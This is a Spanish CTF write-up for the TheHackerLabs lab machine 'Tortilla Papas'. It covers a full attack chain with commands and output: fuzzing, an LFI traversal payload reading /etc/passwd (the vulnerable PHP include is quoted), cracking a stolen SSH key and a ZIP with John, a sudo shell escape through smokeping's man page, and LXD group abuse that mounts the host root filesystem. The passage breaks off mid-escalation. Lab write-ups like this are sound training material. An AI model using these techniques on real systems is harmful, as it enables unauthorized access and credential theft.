---
title: "Tortilla Papas - TheHackerLabs"
date: 2025-03-23
draft: false
slug: "THL-writeup-tortillaPapas"
excerpt: "Una máquina que es lo suficientemente complicada y que necesitas paciencia. Después de analizar los escaneos, entramos a la página web activa. Al no encontrar nada útil, aplicamos Fuzzing, siendo así que encontramos un archivo oculto de PHP. Al revisar este archivo, resulta ser una copia de la página principal. Siendo un archivo PHP, aplicamos Fuzzing para descubrir si ocupa un parámetro con la herramienta wfuzz y usando payloads que aplican LFI. Encontrando el parámetro correcto y viendo que funciona el LFI, tratamos de obtener la llave privada de un usuario, siendo que la encontramos en el directorio /opt. Crackeamos la llave y logramos ganar acceso a la máquina víctima. Dentro, vemos que podemos ocupar un binario llamado smokeping como otro usuario. A este binario, le aplicamos Shell Escape para escapar del manual del binario y convertirnos en el otro usuario. Al no poder ver qué privilegios tiene este usuario, encontramos que pertenece al grupo LXD. Logramos escalar privilegios aprovechandonos de este grupo, creando una montura de todos los archivos de la máquina víctima."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Smokeping", "Fuzzing", "Web Enumeration", "Local File Inclusion (LFI)", "SSH Private Key Theft (LFI)", "Cracking SSH Private Key", "Cracking ZIP", "User Pivoting", "Applying Shell Escape", "Abusing LXD Group", "Privesc - Abusing LXD Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "ssh2john"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "scp"
  - "zip2john"
  - "unzip"
  - "lxc"
  - "git"
  - "Python3"
  - "wget"
links:
  - "https://bugs.gentoo.org/602652"
  - "https://www.tenable.com/plugins/nessus/165443"
  - "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses"
  - "https://github.com/kurobeats/fimap"
  - "https://medium.verylazytech.com/shell-escapes-cheatsheet-214f05ae777e"
  - "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/escaping-from-limited-bash.html#bash-jails"
  - "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html?highlight=lxd#method-1"
  - "https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f"
  - "https://www.hackingarticles.in/lxd-privilege-escalation/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-tortillaPapas/tortillaPapas.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.190
PING 192.168.1.190 (192.168.1.190) 56(84) bytes of data.
64 bytes from 192.168.1.190: icmp_seq=1 ttl=64 time=1.59 ms
64 bytes from 192.168.1.190: icmp_seq=2 ttl=64 time=0.791 ms
64 bytes from 192.168.1.190: icmp_seq=3 ttl=64 time=0.845 ms
64 bytes from 192.168.1.190: icmp_seq=4 ttl=64 time=0.947 ms

--- 192.168.1.190 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3043ms
rtt min/avg/max/mdev = 0.791/1.042/1.586/0.318 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.190 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 13:03 CST
Initiating ARP Ping Scan at 13:03
Scanning 192.168.1.190 [1 port]
Completed ARP Ping Scan at 13:03, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:03
Scanning 192.168.1.190 [65535 ports]
Discovered open port 22/tcp on 192.168.1.190
Discovered open port 80/tcp on 192.168.1.190
Completed SYN Stealth Scan at 13:03, 7.97s elapsed (65535 total ports)
Nmap scan report for 192.168.1.190
Host is up, received arp-response (0.00059s latency).
Scanned at 2025-03-21 13:03:26 CST for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solo hay 2 puertos activos. Es posible que la intrusión sea por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.190 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 13:03 CST
Nmap scan report for 192.168.1.190
Host is up (0.00095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-title: Tortilla Papas
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Como mencione antes, parece que la intrusión será por la página web activa.

Vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura1.png">
</p>

Parece una página dedicada al platillo **Tortilla de Papas**.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura2.png">
</p>

Son bastantes tecnologías, pero no veo que nos ayude alguna.

De ahí en fuera, no veo algo que nos pueda ayudar.

Vamos a aplicar **Fuzzing**, para ver si encontramos algo oculto por ahí.

### Fuzzing {#fuzz}

Para este caso, costo bastante el encontrar el wordlists correcto, pues fue necesario probar varios de los que tiene **Seclists**.

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -z list,php-txt-html-sh http://192.168.1.190/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.190/FUZZ.FUZ2Z
Total requests: 4740960

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   200        480 L    1556 W     26594 Ch    "index - html"                                                                                                               
000147481:   403        9 L      28 W       279 Ch      "php"                                                                                                                        
000147483:   403        9 L      28 W       279 Ch      "html"                                                                                                                       
001590769:   200        480 L    1556 W     26574 Ch    "agua - php"                                                                                                                 

Total time: 0
Processed Requests: 4740960
Filtered Requests: 4740955
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.190/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100 -x php,html,txt,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.190/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/images               (Status: 301) [Size: 317] [--> http://192.168.1.190/images/]
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 26594]
/css                  (Status: 301) [Size: 314] [--> http://192.168.1.190/css/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.1.190/js/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.1.190/javascript/]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/smokeping            (Status: 301) [Size: 320] [--> http://192.168.1.190/smokeping/]
/server-status        (Status: 403) [Size: 279]
/agua.php             (Status: 200) [Size: 26594]
Progress: 5926270 / 5926275 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Encontramos dos cosillas: 
* Un directorio llamado `/smokeping`.
* Un archivo llamado `agua.php`.

Empezaremos por revisar el directorio `/smokeping`.

### Analizando Directorio smokeping {#Smokeping}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura3.png">
</p>

Parece ser un servicio que revisa la latencia de la red interna y la gráfica.

Investiguemos el servicio:

| **Smokeping** |
|:-----------:|
| *Smokeping es una herramienta de código abierto diseñada para la monitorización de la latencia, la pérdida de paquetes y la calidad de la conexión en redes. Fue desarrollada por Tobi Oetiker, el creador de RRDtool y MRTG, herramientas ampliamente utilizadas en el monitoreo de infraestructuras.* |

Ahí mismo, podemos ver la versión que están ocupando:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura4.png">
</p>

Buscando un Exploit para esta versión, encontramos que es vulnerable a una **condición de carrera**:
* <a href="https://bugs.gentoo.org/602652" target="_blank">CVE-2016-20015</a>

Pero para aplicar esto, necesitamos estar dentro de la máquina víctima, por lo que vamos a descartar este servicio de momento.

### Analizando Peticiones y Respuestas de Archivo agua.php {#Agua}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura5.png">
</p>

Parece una copia de la página principal, es algo extraño y revisando el código fuente, no logre identificar algo.

Entonces, podemos probar si existe un parámetro que se esté utilizando dentro del archivo.

Algo que podemos hacer es provocar un error dentro de esta página con **BurpSuite**, con tal de identificar algún cambio y eso lo podemos utilizar como un delimitador en el **Fuzzing**.

Captura la página y mandala al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura6.png">
</p>

Observa que en la respuesta, podemos ver una gran cantidad de bytes en la cabecera **content-length**, siendo **26594**:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura7.png">
</p>

Podemos decir que eso es un resultado positivo.

Lo curioso, es que al tratar de provocar un error, ya sea, poniendo un parámetro random o agregando caracteres extraños a la petición, nos regresa la misma cantidad de bytes:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura8.png">
</p>

Esto nos da a entender, que es posible que se esté aplicando una sanitización o un filtro en las peticiones de este archivo, por lo que sería bueno utilizar ofuscación en nuestras peticiones.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuzzing para Encontrar Parámetro Correcto Utilizando Payload de LFI {#fuzzLFI}

Podemos intentar con los ejemplos de **LFI** que nos muestra **HackTricks**:
* <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses" target="_blank">HackTricks: File Inclusion / Path Traversal - Basic LFI and bypasses</a>

Probemos estos payloads con la herramienta **wfuzz**.

Probando varios de estos, solamente uno es el que funciona, siendo `....//....//....//etc/passwd`.

Observa:
```bash
wfuzz -c --hc=404 --hh=26574 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://192.168.1.190/agua.php?FUZZ=....//....//....//etc/passwd
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.190/agua.php?FUZZ=....//....//....//etc/passwd
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000758:   200        507 L    1588 W     27943 Ch    "file"                                                                                                                       

Total time: 253.3973
Processed Requests: 87664
Filtered Requests: 87663
Requests/sec.: 345.9546
```

Probándolo en la página y **BurpSuite**, podemos ver que si funciona:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura10.png">
</p>

Y ahora que ya encontramos el parámetro correcto, podemos utilizar un wordlists de **Seclist** que tiene varios payloads para aplicar **LFI**, siendo el wordlists `/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`.

Probémoslo:
```bash
wfuzz -c --hc=404 --hh=26574 -t 200 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://192.168.1.190/agua.php?file=FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.190/agua.php?file=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000338:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"     
000000335:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....
                                                        //etc/passwd"                                                                                                                
000000341:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                       
000000353:   200        507 L    1588 W     27943 Ch    "....//....//....//etc/passwd"                                                                                               
000000347:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//etc/passwd"                                                           
000000350:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//etc/passwd"                                                                             
000000344:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                         

Total time: 13.18469
Processed Requests: 929
Filtered Requests: 922
Requests/sec.: 70.46049
```

Ahí están todos esos payloads que funcionaran contra la página para aplicar **LFI**.

### Robando Llave Privada id_rsa a través de LFI, Crackeandola con JohnTheRipper y Conectandonos Vía SSH {#SSHkey}

Analizando el archivo `/etc/passwd`, podemos ver que hay 2 usuarios:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura11.png">
</p>

Uno se llama **concebolla** y el otro **sincebolla**.

Ya que podemos ver archivos de la máquina víctima, una de las cosas que podemos hacer es, tratar de robar las llaves privadas del **servicio SSH** de cualquiera de los dos.

El problema es que al revisar cualquiera de los directorios de ambos usuarios, no encontraremos nada o al menos no obtendremos nada. Quizás, no podemos verlas porque no tenemos los permisos suficientes.

Navegando un poco entre los directorios, encontramos una llave dentro del directorio `/opt`:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura12.png">
</p>

Muy extraño lugar para dejar una llave privada.

Cópiala dentro de un archivo en tu máquina, pues vamos a crackearla para obtener su frase y poder usarla contra el **servicio SSH**.

Una vez que la tengas copiada, vamos a obtener el hash de la llave con la herramienta **ssh2john** y la guardaremos en un archivo:
```bash
ssh2john id_rsa > hash
```

Y con **JohnTheRipper**, crackeamos el hash obtenido:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXX           (id_rsa)     
1g 0:00:01:34 DONE (2025-03-22 23:25) 0.01062g/s 37.81p/s 37.81c/s 37.81C/s cougar..emelec
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Excelente, tenemos la frase de la llave.

Ahora podemos usarla para conectarnos al **servicio SSH**, siendo que al probarla con ambos usuarios, resulto ser la llave privada del **usuario sincebolla**:
```bash
ssh -i id_rsa sincebolla@192.168.1.190
Enter passphrase for key 'id_rsa': 
Linux tortillapapas 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
...
Last login: Thu Apr 18 12:40:58 2024
sincebolla@tortillapapas:~$ whoami
sincebolla
```
Funciono correctamente.

Aquí podemos encontrar la flag del usuario:
```bash
sincebolla@tortillapapas:~$ ls
user.txt
sincebolla@tortillapapas:~$ cat user.txt
...
```

Antes de continuar, quiero comprobar la sanitización que se estaba realizando para aplicar el **LFI** y eso lo podemos encontrar en el directorio `/var/www/tortilla`:
```bash
sincebolla@tortillapapas:~$ ls -la /var/www/tortilla/
total 84
drwxr-xr-x 6 www-data www-data  4096 abr 18  2024 .
drwxr-xr-x 3 root     root      4096 abr 14  2024 ..
-rwxr-xr-x 1 www-data www-data 27010 abr 14  2024 agua.php
drwxr-xr-x 2 www-data www-data  4096 nov 28  2023 css
-rw-r--r-- 1 www-data www-data    56 abr 13  2024 hola.php
drwxr-xr-x 2 www-data www-data  4096 abr 14  2024 images
-rwxr-xr-x 1 www-data www-data 26594 abr 14  2024 index.html
drwxr-xr-x 2 www-data www-data  4096 nov 28  2023 js
drwxr-xr-x 2 www-data www-data  4096 abr 14  2024 tortilla
```
Ahí está el archivo **agua.php** y existe otro llamado **hola.php**, que al parecer es una **Reverse Shell**.

Analizando el archivo **agua.php**, al final, encontramos algo interesante:
```bash
sincebolla@tortillapapas:~$ cat /var/www/tortilla/agua.php 
<!DOCTYPE html>
<html>
   <head>
      <!-- basic -->
      <meta charset="utf-8">
...
...
...
<?php
    $filename = $_GET['file'];

    // Verificar si la URL contiene la secuencia específica
    if (strpos($filename, "....//....//....") !== false) {
        // Eliminar '../' repetidos para evitar exceso de retroceso
        $filename = str_replace("....//....//....", "", $filename);
        // Ahora incluir el archivo
        include("/" . $filename);
    } else {
        echo "";
    }
?>
```
Ahí está la sanitización.

Ahora sí, continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina Linux y Crackeando Archivo ZIP {#enumLin}

Podemos encontrar la llave privada del **usuario sincebolla** y podemos ver que únicamente este usuario puede verla:
```bash
sincebolla@tortillapapas:~$ ls -la .ssh/
total 16
drwx------ 2 sincebolla sincebolla 4096 abr 15  2024 .
drwx------ 4 sincebolla sincebolla 4096 abr 16  2024 ..
-rw------- 1 sincebolla sincebolla  578 abr 14  2024 authorized_keys
-rw------- 1 sincebolla sincebolla 2655 abr 14  2024 id_rsa
```
Por lo que no podríamos haber visto la llave aplicando **LFI** o al menos esa es mi conclusión.

Revisando el directorio `/opt` donde encontramos la llave, encontramos algunas cosillas:
```bash
sincebolla@tortillapapas:~$ ls /opt
cositas.zip  id_rsa  sa_matao_Paco.txt
```
Vemos un **archivo ZIP**, la llave privada y un archivo de texto.

Veamos lo que dice ese mensaje:
```bash
sincebolla@tortillapapas:~$ cat /opt/sa_matao_Paco.txt 
Esta id_rsa es de sincebolla, tan torpe es que la deja aqui, por eso le gusta sin cebolla
```
Con razón encontramos aquí la llave.

Descarguemos el **archivo ZIP** con la herramienta **scp**:
```bash
scp -i id_rsa sincebolla@192.168.1.190:/opt/cositas.zip .
Enter passphrase for key 'id_rsa': 
cositas.zip
```

Tratemos de descomprimirlo:
```bash
unzip cositas.zip
Archive:  cositas.zip
[cositas.zip] id_rsa password:
```
No podemos, pues nos pide una contraseña, así que hay que crackearlo para obtenerla.

Obtengamos el hash de este archivo con la herramienta **zip2john**:
```bash
zip2john cositas.zip > hashZIP
ver 2.0 efh 5455 efh 7875 cositas.zip/id_rsa PKZIP Encr: TS_chk, cmplen=2033, decmplen=2655, crc=7638044A ts=6370 cs=6370 type=8
ver 2.0 efh 5455 efh 7875 cositas.zip/sa_matao_Paco.txt PKZIP Encr: TS_chk, cmplen=85, decmplen=90, crc=01C0A4B7 ts=8DF1 cs=8df1 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Y con **JohnTheRipper**, vamos a crackear el hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cassandra        (cositas.zip)     
1g 0:00:00:00 DONE (2025-03-22 23:32) 33.33g/s 341333p/s 341333c/s 341333C/s 123456..1asshole
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Bien, obtuvimos la contraseña del **archivo ZIP**.

Ahora sí, descomprimamos ese archivo:
```bash
unzip cositas.zip
Archive:  cositas.zip
[cositas.zip] id_rsa password: 
replace id_rsa? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
new name: id_rsaCositas
  inflating: id_rsaCositas           
  inflating: sa_matao_Paco.txt       

ls
cositas.zip  hash  hashZIP  id_rsa  id_rsaCositas  sa_matao_Paco.txt
```
Parece que obtuvimos los mismos archivos que encontramos en el directorio `/opt`.

### Aplicando Shell Escape para Escalar Privilegios y Convertirnos en Usuario concebolla {#shellEsc}

Si revisamos los privilegios que tiene el **usuario sincebolla**, podremos ver que podemos usar un binario:
```bash
sincebolla@tortillapapas:~$ sudo -l
Matching Defaults entries for sincebolla on tortillapapas:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
.
User sincebolla may run the following commands on tortillapapas:
    (concebolla) NOPASSWD: /usr/sbin/smokeping
```
Investigando un poco, encuentro que podemos intentar aplicar **Shell Escape** si es que podemos utilizar el argumento **man**.

| **Shell Escape** |
|:-----------:|
| *Un Shell Escape es una técnica que permite salir de un programa restringido y obtener acceso a una shell interactiva. Se usa comúnmente en entornos donde se ejecutan programas con privilegios elevados o en sistemas restringidos para intentar obtener acceso no autorizado.* |

Veamos si podemos verlo con el argumento **--help**:
```bash
sincebolla@tortillapapas:~$ sudo -u concebolla /usr/sbin/smokeping --help
Usage:
    smokeping [ --email | --makepod | --version | --restart ]

     Options:

     --man[=x]    Show the manpage for the program (or for probe x, if specified)

     --help       Help :-)
```
Ahí está.

Aquí dejo algunos links de referencia:
* <a href="https://medium.verylazytech.com/shell-escapes-cheatsheet-214f05ae777e" target="_blank">Shell Escapes Cheatsheet</a>
* <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/escaping-from-limited-bash.html#bash-jails" target="_blank">HackTricks: Escaping from Jails - Bash Jails</a>

Entremos al **argumento man**:
```bash
sincebolla@tortillapapas:~$ sudo -u concebolla /usr/sbin/smokeping --man
```
Ahora estamos dentro del manual del binario.

Probemos si nos permite escribir el símbolo `!` o `:`:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura15.png">
</p>

Parece que solo nos permite escribir el símbolo `!`, esto es bueno.

Podemos probar dos formas de escapar del manual:

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura13.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-tortillaPapas/Captura14.png">
</p>

Ejecutando cualquiera de esas dos, permite que escapemos del manual y nos convertimos en el **usuario concebolla**:
```bash
concebolla@tortillapapas:/home/sincebolla$ whoami
concebolla
```

### Escalando Privilegios Aprovechandonos del Grupo lxd {#lxd}

Al revisar los privilegios de nuestro usuario, nos pide la contraseña del usuario, que no tenemos, por lo que no sabemos que acciones podemos realizar:
```bash
concebolla@tortillapapas:~$ sudo -l
[sudo] contraseña para concebolla: 
sudo: a password is required
```

Y revisando el directorio de este usuario, no encontraremos nada:
```bash
concebolla@tortillapapas:~$ ls -la
total 32
drwx------ 4 concebolla concebolla 4096 mar 23 08:08 .
drwxr-xr-x 4 root       root       4096 abr 13  2024 ..
lrwxrwxrwx 1 root       root          9 abr 14  2024 .bash_history -> /dev/null
-rw-r--r-- 1 concebolla concebolla  220 abr 12  2024 .bash_logout
-rw-r--r-- 1 concebolla concebolla 3526 abr 12  2024 .bashrc
drwxr-x--- 3 concebolla concebolla 4096 abr 13  2024 .config
-rw------- 1 concebolla concebolla   40 mar 23 08:08 .lesshst
drwxr-xr-x 3 concebolla concebolla 4096 mar 23 08:02 .local
-rw-r--r-- 1 concebolla concebolla  807 abr 12  2024 .profile
```

Pero al revisar los grupos a los que pertenece, encontramos que está dentro del grupo **LXD**.

| **LXD** |
|:-----------:|
| *LXD es una capa de administración sobre LXC, diseñada para proporcionar una experiencia similar a la de una máquina virtual, pero con la eficiencia de los contenedores. Ofrece una forma sencilla de crear y gestionar contenedores de sistemas operativos completos, como Ubuntu, Debian, Alpine, etc.* |

| **Grupo LXD** |
|:-----------:|
| *En los sistemas donde LXD está instalado, existe un grupo de usuarios llamado lxd. Este grupo permite a los usuarios ejecutar y administrar contenedores sin necesidad de permisos root. Si un usuario forma parte del grupo lxd, puede ejecutar comandos de LXD sin necesidad de usar sudo.* |

#### Escalando Privilegios Aprovechandonos del Grupo LXD y Con Internet en la Máquina Víctima {#lxd2}

En el siguiente blog, podemos encontrar una forma de crear una montura de todo el sistema con la herramienta **lxc**, siendo esta una forma en la que es necesario tener internet en la máquina víctima:
* <a href="https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f" target="_blank">Privilege Escalation Using LXD/LXC Group Assignment To A User: A Security Misconfiguration</a>

Vamos a ponerlo a prueba:

* Mostrando los storages disponibles en **LXD**:
```bash
concebolla@tortillapapas:~$ lxc storage list
+---------+--------+------------------------------------+-------------+---------+---------+

|  NAME   | DRIVER |               SOURCE               | DESCRIPTION | USED BY |  STATE  |
+---------+--------+------------------------------------+-------------+---------+---------+

| default | dir    | /var/lib/lxd/storage-pools/default |             | 2       | CREATED |
+---------+--------+------------------------------------+-------------+---------+---------+
```

* Creando un nuevo almacenamiento al que llamamos **mypool**:
```bash
concebolla@tortillapapas:~$ lxc storage create mypool dir
Storage pool mypool created
```

* Creando un **contenedor LXC**(`lxc init`) llamado **test** (nombre del contenedor) basado en la imagen **ubuntu:16.04** y configurandolo como privilegiado (`-c security.privileged=true`):
```bash
concebolla@tortillapapas:~$ lxc init ubuntu:16.04 test -c security.privileged=true
Creating test
Retrieving image: Unpack: 100% (3.17GB/s)
```

* Revisamos que se haya creado el contenedor:
```bash
concebolla@tortillapapas:~$ lxc ls
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

|   NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| ignite   | RUNNING |        XXXX  (eth0) |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| test     | STOPPED |                     |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
```

* Montando el sistema de archivos del host dentro del **contenedor LXC** llamado **test**:
```bash
concebolla@tortillapapas:~$ lxc config device add test hack disk source=/ path=/mnt/root recursive=true 
Device hack added to test
```
Aquí `lxc config device add` agrega un dispositivo al contenedor **test**, el nombre **hack** es el que se le asignó al dispositivo agregado, **disk** define el tipo de dispositivo siendo este caso un **disco (filesystem)**, `source=/` crea la montura de la raíz del host dentro del contenedor, `path=/mnt/root` indica que la montura quedara dentro del contenedor en la ruta `/mnt/root`, y por último `recursive=true` incluye todo el contenido de `/`, permitiendo el acceso recursivo a todos los archivos y subdirectorios.

* Iniciando contenedor **test**:
```bash
concebolla@tortillapapas:~$ lxc start test
```

* Listando los contenedores activos:
```bash
concebolla@tortillapapas:~$ lxc ls
+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+

|  NAME  |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+

